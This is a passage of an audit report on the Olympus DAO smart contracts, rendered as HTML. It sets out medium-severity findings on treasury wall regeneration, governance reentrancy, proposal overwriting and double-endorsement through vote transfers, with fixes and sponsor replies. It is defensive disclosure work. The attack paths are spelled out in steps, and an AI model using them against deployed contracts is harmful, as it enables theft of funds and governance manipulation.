version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use openzeppelin’s safeERC20 or implement a code existence check.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/117#issuecomment-1240019949\">ind-igo (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Confirmed. Will implement this. Thank you.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-rbs-may-redeploy-funds-automatically-if-price-stays-above-or-below-wall-for-longer-than-_configregenwait\" style=\"position:relative;\"><a href=\"#m-03-rbs-may-redeploy-funds-automatically-if-price-stays-above-or-below-wall-for-longer-than-_configregenwait\" aria-label=\"m 03 rbs may redeploy funds automatically if price stays above or below wall for longer than _configregenwait permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/118\">[M-03] RBS may redeploy funds automatically if price stays above or below wall for longer than <code>_config.regenWait</code></a></h2>\n<p><em>Submitted by 0x52</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L195-L268\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L195-L268</a><br></p>\n<p>Loss of treasury funds.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L133-L139\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L133-L139</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (capacity_ &lt; _range.high.threshold &amp;&amp; _range.high.active) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Set wall to inactive</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _range.high.active = false;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _range.high.lastActive = uint48(block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit WallDown(true, block.timestamp, capacity_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>_range.high.lastActive and _range.low.lastActive are only updated in RANGE.sol when _range.x.capacity &#x3C; _range.x.threshold and the _range.x.active == true. After this is tripped, _range.x.active will be set to false, meaning that _range.x.lastActive will not be updated again until the wall is regenerated and capacity is restored.</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L209-L214\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L209-L214</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint48(block.timestamp) &gt;= RANGE.lastActive(true) + uint48(config_.regenWait) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _status.high.count &gt;= config_.regenThreshold</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _regenerate(true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>If 1) the price were to sustain outside of the range (high volatility for volatile asset, black swan for stable) for longer than config_.regenWait and 2) config_regenThreshold satisfies the following equation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">config_.regenThreshold &lt;= _config.regenObserve - config_.regenWait / frequency</span></span></code></pre>\n<p>then <em>status.high.count could be greater than config</em>.regenThreshold. This would trigger more funds to be deployed even though the price never came back inside the wall price.</p>\n<p>In this scenario the wall price would be far from the true price of the asset leading to loss of treasury funds as it buys/sell at prices well above/below market price.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A check should be added to verify that the price is within the wall price before regenerating. Alternatively, config_.regenTheshold could be set to satisfy the following equation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">config_.regenThreshold &gt; _config.regenObserve - config_.regenWait / frequency</span></span></code></pre>\n<p>This would eliminate the risk as _status.high.count >= config_.regenThreshold could never be true for a sustained period where current price is greater than the wall price.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/118#issuecomment-1235838436\">Oighty (Olympus) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>This is valid. Our intended parameterization of the system would not be subject to this vulnerability, but it would be an issue if the system was incorrectly parameterized. Because it is an edge case, I’m not sure it is a high risk bug though.</p>\n<p>Another potential fix is resetting the <code>count</code> to 0 and the <code>observations</code> array to <code>new bool[](regenObserve)</code> to clear out positive values from when a wall goes down. This could be done in the <code>_updateCapacity()</code> function by checking if the new capacity is under the threshold.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/118#issuecomment-1252356234\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Going to downgrade to Medium as the external dependency is a configuration that is not planned to be used by the sponsor. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-olympusgovernanceexecuteproposal-reentrancy-attack-vulnerable-function\" style=\"position:relative;\"><a href=\"#m-04-olympusgovernanceexecuteproposal-reentrancy-attack-vulnerable-function\" aria-label=\"m 04 olympusgovernanceexecuteproposal reentrancy attack vulnerable function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/132\">[M-04] <code>OlympusGovernance#executeProposal</code>: reentrancy attack vulnerable function</a></h2>\n<p><em>Submitted by carlitox477, also found by cryptphi and ladboy233</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288</a></p>\n<p>Given that the activeProposal change is done before the for loop, if this function is call through one <code>kernel.executeAction(instruction,target)</code> we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>For instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:</p>\n<ol>\n<li>Call executeAction</li>\n<li>This allow us to call kernel.executeAction in the for loop</li>\n<li>executAction allow us to call <strong>_installModule</strong></li>\n<li><strong>_installModule</strong> allow us to call <strong>newModule_.Init</strong></li>\n<li>By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use nonReentrant modifier or move the line <code>activeProposal = ActivatedProposal(0, 0);</code> before the for loop.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/132#issuecomment-1236240839\">fullyallocated (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>I don’t know if funds are going to be threatened, but this does allow for a re-entrancy. Warden is correct in resetting the active Proposal before the for loop based on the checks-effects-interactions code design pattern.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-proposals-overwrite\" style=\"position:relative;\"><a href=\"#m-05-proposals-overwrite\" aria-label=\"m 05 proposals overwrite permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/201\">[M-05] Proposals overwrite</a></h2>\n<p><em>Submitted by 0x1f8b</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L66\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L66</a></p>\n<p>It is possible to overwrite proposals in certain circumstances. The method <code>Governance.submitProposal</code> doesn’t check if the <code>proposalId</code> (stored in a different contract) exists already as a valid proposal in <code>getProposalMetadata</code>.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If the project update the kernel module ”<code>INSTR</code>” and reconfigure proposals and call <code>INSTR.store(instructions_);</code>, the counter may return a <code>proposalId</code> of an existing proposal and overwrite an existing previous one.</p>\n<p>This is due to the fact that the proposals are saved in a mapping of a contract that is not related to the one that returns the counters, and furthermore, they do not check that the record already exists.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">INSTR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">store</span><span class=\"mtk1\">(</span><span class=\"mtk12\">instructions_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">getProposalMetadata</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">ProposalMetadata</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">title_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">proposalURI_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Store the proposal metadata in the same <code>INSTR</code> contract or ensure that the proposal doesn’t exist.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/201#issuecomment-1234818897\">fullyallocated (Olympus) acknowledged, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Agreed with the validity of the circumstance, but it is contingent on us upgrading the contract in an unexpected way. Is the same as saying “if you upgrade a contract incorrectly it can break the dependencies”. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/201#issuecomment-1249566680\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Going to downgrade to medium based on some external requirements needing to be in place to be realized. </p>\n<p><code>Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</code></p>\n<p>Function of the protocol could be impacted and there are external requirements. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-after-endorsing-a-proposal-user-can-transfer-votes-to-another-user-for-endorsing-the-same-proposal-again\" style=\"position:relative;\"><a href=\"#m-06-after-endorsing-a-proposal-user-can-transfer-votes-to-another-user-for-endorsing-the-same-proposal-again\" aria-label=\"m 06 after endorsing a proposal user can transfer votes to another user for endorsing the same proposal again permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/239\">[M-06] After endorsing a proposal, user can transfer votes to another user for endorsing the same proposal again</a></h2>\n<p><em>Submitted by rbserver, also found by 0x1f8b, Bahurum, csanuragjain, and yixxas</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236</a></p>\n<p>The following comment indicates that the <code>OlympusVotes</code> contract is a stub for <code>gOHM</code>. Checking the <code>gOHM</code> contract at <a href=\"https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code\">https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code</a>, the <code>transfer</code> and <code>transferFrom</code> functions are available.</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Votes module is the ERC20 token that represents voting power in the network.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev    This is currently a substitute module that stubs gOHM.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OlympusVotes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Module</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>Moreover, the <a href=\"https://hackmd.io/iWgqYLFwShGUDBF4zh397w#3-Vote-Redemption\">documentation</a> states that the vote redemption mechanism “exists to deter malicious behavior by ensuring users cannot transfer their voting tokens until after the proposal has been resolved”, which also indicates that the voting tokens are meant to be transferrable between users.</p>\n<p>When the voting tokens are transferrable, one user can first use her or his votes to call the following <code>endorseProposal</code> function to endorse a proposal and then transfer these votes to another user. The other user can use these votes to endorse the same proposal again afterwards. Because of the double-endorsement, the <code>(totalEndorsementsForProposal[proposalId_] * 100) &#x3C; VOTES.totalSupply() * ENDORSEMENT_THRESHOLD</code> condition can become true so the proposal can be activated by calling the <code>activateProposal</code> function below. However, the proposal should only be endorsed with these same votes once and should not be able to be activated if it could not satisify <code>(totalEndorsementsForProposal[proposalId_] * 100) &#x3C; VOTES.totalSupply() * ENDORSEMENT_THRESHOLD</code> with these votes being used once.</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">endorseProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CannotEndorseNullProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Instruction</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">INSTR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getInstructions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">instructions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CannotEndorseInvalidProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// undo any previous endorsement the user made on these instructions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousEndorsement</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">previousEndorsement</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// reapply user endorsements with most up-to-date votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">userEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">][</span><span 